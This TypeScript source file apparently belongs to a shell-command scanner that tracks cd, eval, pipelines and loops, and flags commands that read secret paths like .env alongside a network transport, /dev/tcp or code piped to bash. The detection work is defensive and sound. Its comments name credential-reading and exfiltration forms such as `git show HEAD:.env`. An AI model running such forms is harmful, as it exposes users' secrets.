// A command that turns its input into arguments for another (`… | xargs grep x`).
function isXargsCommand(cmd: ShellCommand): boolean {
  const argv = commandArgv(cmd);
  const inner = wrapperCommand(argv).index;
  return argv.slice(0, Math.min(inner, argv.length)).some((word) => word !== undefined && program(word) === "xargs");
}

// Track `cd`, `chdir`, `pushd` and `popd` (also behind `builtin`/`command`). A static target adds a candidate directory; anything the scanner cannot resolve — a variable, a substitution, a glob, `cd -` or a stack rotation before this command changed directory — makes the cwd unknown and asks.
function trackDirectoryChange(cmd: ShellCommand, state: ScanState): void {
  let words = cmd.words;
  for (;;) {
    const head = words[0] === undefined ? undefined : staticShellWord(words[0]);
    if (head === "builtin") { words = words.slice(1); continue; }
    if (head === "command") {
      words = words.slice(1);
      while (words[0] !== undefined && /^-[pvV]+$/.test(staticShellWord(words[0]) ?? "")) words = words.slice(1);
      continue;
    }
    break;
  }
  const name = words[0] === undefined ? undefined : staticShellWord(words[0]);
  if (name === "eval") {
    // `eval` runs its text in this shell, so a directory change inside it persists.
    const code = words.slice(1).map((word) => staticShellWord(word));
    if (code.some((text) => text === undefined || /(?:^|[^\w./-])(?:cd|chdir|pushd|popd)(?![\w.-])/.test(text))) {
      markCwdUnknown(state, "eval may change directory");
    }
    return;
  }
  if (name !== "cd" && name !== "chdir" && name !== "pushd" && name !== "popd") return;
  let success: (string | undefined)[] | undefined;
  const operands: ShellWord[] = [];
  let delimited = false;
  for (const word of words.slice(1)) {
    const text = staticShellWord(word);
    if (!delimited && text === "--") { delimited = true; continue; }
    // `-L -P -e -@` (cd) and `-n` (pushd/popd) are options; `-` and `-N` are operands.
    if (!delimited && text !== undefined && /^-[LPe@n]+$/.test(text)) continue;
    operands.push(word);
  }
  const stackReference = (): void => {
    // OLDPWD and the directory stack hold only earlier candidates once this command has changed directory; before that they are inherited.
    if (!state.dirChanged) markCwdUnknown(state, `${name} refers to a directory this command did not set`);
  };
  if (name === "popd") stackReference();
  else if (operands.length === 0) {
    if (name === "pushd") stackReference();
    else if (state.homeReassigned) markCwdUnknown(state, "cd target depends on a reassigned HOME");
    else {
      const homes = expandShellTildePaths("~");
      success = homes;
      for (const home of homes) addCwd(state, home);
    }
  } else if (operands.length > 1) {
    markCwdUnknown(state, `${name} with several operands is not tracked`);
  } else {
    const text = staticShellWord(operands[0]!);
    if (text === "-" || (text !== undefined && /^[+-]\d+$/.test(text))) stackReference();
    else {
      const targets = cdTargets(operands[0]!, state);
      if (typeof targets === "string") markCwdUnknown(state, targets);
      else {
        success = targets;
        for (const target of targets) addCwd(state, target);
      }
    }
  }
  state.dirChanged = true;
  // Past the candidate limit the cwd is unknown, which a success view must not hide.
  state.cdSuccess = state.cwdUnknown ? undefined : success;
}

// Scan a loop body until the directories it may change to stop growing.
function scanUntilCwdStable(scan: () => void, state: ScanState): void {
  let version: number;
  do {
    version = state.cwdVersion;
    scan();
  } while (version !== state.cwdVersion && !state.sensitive);
}

// `git show HEAD:.env`, `git cat-file -p :.env`: the path inside a `<rev>:<path>` object name.
function scanGitObjectPaths(cmd: ShellCommand, state: ScanState): void {
  if (state.sensitive || program(staticShellWord(cmd.words[0]!))?.toLowerCase() !== "git") return;
  for (const word of cmd.words.slice(1)) {
    const text = staticShellWord(word);
    if (text === undefined || text.startsWith("-")) continue;
    const object = /^[^:]*:(?!\/\/)(.+)$/.exec(text);
    if (object) checkRawText(object[1]!, state);
    if (state.sensitive) return;
  }
}

function scanStatement(statement: ShellStatement, state: ScanState): void {
  switch (statement.kind) {
    case "command": {
      // `env -C`, `git -C`, `make -C`, `tar -C`, `--prefix` … move this command alone.
      const restoreCwd = applyCommandCwdSwitch(statement, state);
      const metadataListing = state.metadataListing;
      state.metadataListing = isMetadataListing(statement, state);
      for (const word of statement.words) {
        const text = wordText(word);
        if (text === "--") break;
        if (text === "--env-file") checkGlob(escapeGlob(".env"), state);
      }
      if (needsCodeTextScan(statement)) {
        state.hidden = true;
        scanCodeOf(statement, state);
      } else {
        // Embedded literal paths remain a floor without a program-option model. Here-document data is inspected as code only when the recipient runs it.
        for (const word of statement.words) {
          const text = staticShellWord(word) ?? word.source.raw;
          if (!isNonFileUrlArgument(text)) scanCodeText(text, state);
        }
      }
      if (statement.words.length > 0 && isNetworkProgram(commandArgv(statement))) state.network = true;
      for (const word of statement.words) checkWord(word, state);
      if (statement.words.length > 0) {
        scanGitObjectPaths(statement, state);
        scanRecursiveSearch(statement, state);
      }
      for (const assignment of statement.assignments) {
        checkWord(assignment.value, state);
        for (const element of assignment.elements ?? []) checkWord(element, state);
      }
      for (const redirect of statement.redirects) {
        if (redirect.target) scanRedirectTarget(redirect.target, state);
        // Here-document text is data, but substitutions inside it run.
        for (const part of redirect.data?.parts ?? []) if (part.kind === "substitution") scanStatement(part.body, state);
      }
      restoreCwd?.();
      state.metadataListing = metadataListing;
      state.cdSuccess = undefined;
      if (statement.words.length > 0) trackDirectoryChange(statement, state);
      return;
    }
    case "pipeline": {
      // A stage fed code by an earlier one (`echo '…' | bash`): the feeders' text is that code.
      const stages = statement.statements.flatMap(commandsIn);
      if (stages.some(needsCodeTextScan)) for (const stage of stages) scanCodeOf(stage, state);
      // A stage whose output `xargs` turns into arguments hands its listing on as reads.
      statement.statements.forEach((child, index) => {
        const { feedsXargs, xargsUpstream } = state;
        state.feedsXargs = statement.statements.slice(index + 1).some((later) => commandsIn(later).some(isXargsCommand));
        state.xargsUpstream = commandsIn(child).some(isXargsCommand) ? statement.statements.slice(0, index) : undefined;
        scanStatement(child, state);
        state.feedsXargs = feedsXargs;
        state.xargsUpstream = xargsUpstream;
      });
      state.cdSuccess = undefined;
      return;
    }
    case "sequence":
      for (const child of statement.statements) scanStatement(child, state);
      state.cdSuccess = undefined;
      return;
    case "and": {
      // The right side runs only after the left succeeded: a static `cd` on the left is the right side's whole cwd. Afterwards the left may have failed instead, so every candidate stays (`cd x && y; z`).
      scanStatement(statement.left, state);
      const success = state.cdSuccess;
      const candidates = state.cwds;
      if (success) state.cwds = [...success];
      scanStatement(statement.right, state);
      const rightSuccess = state.cdSuccess;
      state.cwds = [...new Set([...candidates, ...state.cwds])];
      state.cdSuccess = rightSuccess;
      return;
    }
    case "or":
      scanStatement(statement.left, state);
      scanStatement(statement.right, state);
      state.cdSuccess = undefined;
      return;
    case "subshell": case "background": case "negate":
      scanStatement(statement.body, state);
      state.cdSuccess = undefined;
      return;
    case "function":
      // The body runs where the function is called, which may be after a later `cd`.
      scanStatement(statement.body, state);
      state.functions.push({ body: statement.body, version: state.cwdVersion });
      state.cdSuccess = undefined;
      return;
    case "redirected": {
      for (const redirect of statement.redirects) if (redirect.target) scanRedirectTarget(redirect.target, state);
      state.cdSuccess = undefined;
      // `cd x 2>/dev/null && …`: the redirection does not change what success means.
      scanStatement(statement.body, state);
      return;
    }
    case "for":
      for (const value of statement.values ?? []) checkWord(value, state);
      // A later iteration runs in the directory an earlier one changed to.
      scanUntilCwdStable(() => scanStatement(statement.body, state), state);
      state.cdSuccess = undefined;
      return;
    case "while":
      scanUntilCwdStable(() => {
        scanStatement(statement.condition, state);
        scanStatement(statement.body, state);
      }, state);
      state.cdSuccess = undefined;
      return;
    case "if":
      scanStatement(statement.condition, state);
      scanStatement(statement.consequent, state);
      scanStatement(statement.alternate, state);
      state.cdSuccess = undefined;
      return;
    case "unsupported":
      state.hidden = true;
      if (NETWORK_DEVICE.test(statement.source.raw) || NETWORK_WORD.test(statement.source.raw)) state.network = true;
      scanCodeText(statement.source.raw, state);
      state.cdSuccess = undefined;
      return;
    default: {
      const exhaustive: never = statement;
      void exhaustive;
    }
  }
}

function boundedInspectionText(command: string): string {
  if (command.length <= SHELL_ANALYSIS_LIMITS.sourceBytes) return command;
  const half = SHELL_PATH_SCAN_LIMITS.chars / 2;
  return `${command.slice(0, half)} ${command.slice(-half)}`;
}

function scanStateFor(parsed: ParsedShellCommand, cwd: string | undefined): ScanState {
  return shellFact(parsed, `scan-state\0${cwd ?? ""}`, () => createScanState(cwd, /dotglob|GLOBIGNORE/.test(parsed.command), undefined, parsed.command));
}

function scanParsedInto(parsed: ParsedShellCommand, state: ScanState): void {
  if (!parsed.analysis.ok) {
    const visible = boundedInspectionText(parsed.command);
    state.hidden = true;
    state.network ||= NETWORK_DEVICE.test(visible) || NETWORK_WORD.test(visible);
    scanCodeText(visible, state);
  } else {
    scanStatement(parsed.analysis.program, state);
    // Rescan function bodies against directories added after their definition.
    for (let stale = state.functions.find((fn) => fn.version !== state.cwdVersion); stale && !state.sensitive;
      stale = state.functions.find((fn) => fn.version !== state.cwdVersion)) {
      stale.version = state.cwdVersion;
      scanStatement(stale.body, state);
    }
  }
}

function scanCommand(parsed: ParsedShellCommand, cwd: string | undefined): ScanState {
  return shellFact(parsed, `scan\0${cwd ?? ""}`, () => {
    const state = scanStateFor(parsed, cwd);
    scanParsedInto(parsed, state);
    return state;
  });
}

function readerIndependentSignal(scan: ScanState): string | null {
  if (scan.sensitive && scan.sender) return `sensitive path argument (${scan.sensitive})`;
  return scan.sensitive && (scan.network || scan.hidden)
    ? `sensitive path (${scan.sensitive}) with ${scan.network ? "a network transport" : "hidden code"}` : null;
}

// Static text an `echo`/`printf` feeder writes to the next pipeline stage, or undefined.
function staticFeederText(cmd: ShellCommand): string | undefined {
  const words = cmd.words.map(wordText);
  const name = program(words[0]);
  if ((name !== "echo" && name !== "printf") || words.some((word) => word === undefined)) return undefined;
  const args = (words as string[]).slice(1);
  while (name === "echo" && /^-[neE]+$/.test(args[0] ?? "")) args.shift();
  return args.join(" ").replace(/\\n/g, "\n");
}

function signalFor(command: string, ctx: Context): string | null {
  const parsed = parseShellCommand(command);
  const specific = signalForParsed(parsed, ctx);
  if (specific) return specific;
  scanParsedInto(parsed, ctx.scan);
  return readerIndependentSignal(ctx.scan);
}

function signalForParsed(parsed: ParsedShellCommand, ctx: Context): string | null {
  const { command, analysis } = parsed;
  if (!analysis.ok) {
    const visible = boundedInspectionText(command);
    return UNPARSED_FALLBACK.test(visible) || UNPARSED_FILE_SOURCE.test(visible) ? "curl/wget body from a file (unparsed)" : null;
  }
  collectTainted(analysis.program, ctx);
  return walk(analysis.program, ctx);
}

// The exfiltration signal for a shell command, or `null`. `cwd` resolves relative path arguments for the sensitive-path check. Pass a ParsedShellCommand to share one parse with the other consumers.
export function shellExfiltrationSignal(input: ShellCommandInput, cwd?: string): string | null {
  const parsed = asParsedShellCommand(input);
  return shellFact(parsed, `exfiltration\0${cwd ?? ""}`, () => {
    const specific = signalForParsed(parsed, { cwd, depth: 0, tainted: new Set(), scan: scanStateFor(parsed, cwd) });
    if (specific) return specific;
    // Reader-independent: a sensitive path anywhere plus any way to send it (a network-capable program, a `/dev/tcp` redirection) or code the matcher cannot read.
    return readerIndependentSignal(scanCommand(parsed, cwd));
  });
}

// The sensitive-path floor for shell commands, or `null`: a sensitive or secret path anywhere in the command line (same normalization as the exfiltration scan). Never allowed by a rule; asks in every mode.
export function shellSensitivePathSignal(input: ShellCommandInput, cwd?: string): string | null {
  const hit = scanCommand(asParsedShellCommand(input), cwd).sensitive;
  return hit ? `sensitive path argument (${hit})` : null;
}

// Incomplete path inspection is an ordinary ask, never credential evidence.
export function shellScanOrdinaryAsk(input: ShellCommandInput, cwd?: string): string | null {
  const scan = scanCommand(asParsedShellCommand(input), cwd);
  return scan.ordinaryAsk ?? scan.cdAsk ?? scan.confinedAsk ?? null;
}
